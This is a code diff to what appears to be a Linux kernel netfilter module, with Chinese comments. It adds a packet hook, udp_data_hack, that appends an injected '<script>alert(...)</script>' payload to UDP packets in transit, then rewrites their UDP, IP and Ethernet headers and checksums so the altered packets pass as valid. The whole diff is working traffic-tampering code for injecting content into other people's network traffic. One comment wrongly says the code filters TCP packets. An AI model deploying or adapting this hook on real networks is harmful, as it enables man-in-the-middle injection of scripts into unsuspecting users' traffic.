@@ -47,6 +47,8 @@ struct udphdr {
 };
 */
 
+static void 	add_udp_hackdata(struct sk_buff *skb);
+
 //=================================================================
 // 初始化 udp_trans_info
 //=================================================================
@@ -126,4 +128,144 @@ int udp_prt_info(struct sk_buff *skb)
 	struct udphdr *udph = udp_hdr(skb);   
 
 	printk("src port %u , dst port %u\n",htons(udph->source), htons(udph->dest));	
+}
+
+
+
+
+
+
+//=================================================================
+// 通过ip地址、端口过滤tcp数据包
+//=================================================================
+int udp_data_hack(struct sk_buff *skb)  
+{  
+	//for test
+	//printk("upd_data_hack start:\n");
+
+   	struct udphdr *udph = udp_hdr(skb); 
+	struct iphdr *iph = ip_hdr(skb);  
+	struct ethhdr *mach = (struct ethhdr*)(skb->head + skb->mac_header);	
+
+	unsigned short src_port;
+	unsigned short dst_port; 
+	struct iaddr src_ip;
+	struct iaddr dst_ip; 
+	struct hwaddr src_mac;
+	struct hwaddr dst_mac;
+	unsigned short mac_type;
+	unsigned char protocol;
+	unsigned short udp_len;
+	
+	unsigned short offset;
+	unsigned short ip_len;
+	unsigned char flag;
+	
+	//1）添加 hack 数据
+	add_udp_hackdata(skb);
+
+	//2）获取各种参数值
+	offset		= (little_big_16(iph->frag_off))&0x1fff;
+	flag		= ((little_big_16(iph->frag_off))>>13)&0x7;
+	ip_len		= little_big_16(iph->tot_len);
+	
+	src_port	= little_big_16(udph->source);
+	dst_port	= little_big_16(udph->dest);
+
+	udp_len		= little_big_16(udph->len);
+		
+	protocol	= PROTOCOL_UDP;
+	
+	src_ip.addr1	= (iph->saddr&0x000000FF)>>0;
+	src_ip.addr2	= (iph->saddr&0x0000FF00)>>8;
+	src_ip.addr3	= (iph->saddr&0x00FF0000)>>16;
+	src_ip.addr4	= (iph->saddr&0xFF000000)>>24;
+
+	dst_ip.addr1	= (iph->daddr&0x000000FF)>>0;
+	dst_ip.addr2	= (iph->daddr&0x0000FF00)>>8;
+	dst_ip.addr3	= (iph->daddr&0x00FF0000)>>16;
+	dst_ip.addr4	= (iph->daddr&0xFF000000)>>24;
+
+	src_mac.addr1	= mach->h_source[0];
+	src_mac.addr2	= mach->h_source[1];
+	src_mac.addr3	= mach->h_source[2];
+	src_mac.addr4	= mach->h_source[3];
+	src_mac.addr5	= mach->h_source[4];
+	src_mac.addr6	= mach->h_source[5];
+
+	dst_mac.addr1	= mach->h_dest[0];
+	dst_mac.addr2	= mach->h_dest[1];
+	dst_mac.addr3	= mach->h_dest[2];
+	dst_mac.addr4	= mach->h_dest[3];
+	dst_mac.addr5	= mach->h_dest[4];
+	dst_mac.addr6	= mach->h_dest[5];
+
+	mac_type	= mach->h_proto;
+
+	//3）增加 udp header
+	add_udp_header(skb, src_ip, udp_len, dst_ip, protocol, src_port, dst_port);
+
+	//4）增加 ip header
+	add_ipv4_header(skb, src_ip, iph->ttl, dst_ip, protocol, iph->tos, big_little_16(ip_len), offset,  flag);
+
+	//5）增加 frame header
+	add_frame_header(skb, mac_type, dst_mac, src_mac);
+
+
+	return NF_ACCEPT;      	 
+} 
+
+//===========================================================================
+// add hack data
+//===========================================================================
+static void 	add_udp_hackdata(struct sk_buff *skb)
+{
+	unsigned short ip_len;
+	unsigned short udp_len;
+	int hack_data_len;
+
+	char hack_data[HACKDATA_LEN]	= "<script>alert('test')</script>\n";
+
+	//1）加入hack data 到 skb[]中	
+	hack_data_len		= str_len(hack_data);	
+	
+	char *hd		= skb_put(skb, hack_data_len);
+	str_cpy(hd, hack_data, hack_data_len);
+
+	//2）更新 ip_len
+	struct iphdr *iph 	= ip_hdr(skb);
+	
+	ip_len			= little_big_16(iph->tot_len);
+	ip_len			+= hack_data_len;	
+	iph->tot_len 		= big_little_16(ip_len);
+
+	//3）更新 udp_len
+	struct udphdr *udph = udp_hdr(skb); 
+	
+	udp_len			= little_big_16(udph->len);
+	udp_len			+= hack_data_len;	
+	udph->len 		= big_little_16(udp_len);	
+}
+
+
+//===========================================================================
+// add_udp_header
+//===========================================================================
+void 	add_udp_header(struct sk_buff *skb, struct iaddr src_ip, unsigned short udp_len, struct iaddr dst_ip, unsigned char protocol,unsigned short src_port, unsigned short dst_port)
+{	
+	//-------------------------------------------------------------------------
+	// add udp header
+	//-------------------------------------------------------------------------
+	struct udphdr *udph = udp_hdr(skb); 
+
+	udph->source	= big_little_16(src_port);
+	udph->dest	= big_little_16(dst_port);
+	udph->len	= big_little_16(udp_len);
+
+	//计算校验和
+	struct iphdr *iph 	= ip_hdr(skb);
+
+	udph->check		= 0;
+	skb->csum 		= csum_partial((unsigned char *)udph, (udp_len),0);
+	udph->check		= csum_tcpudp_magic(iph->saddr,iph->daddr, (udp_len),iph->protocol, skb->csum);	
 }
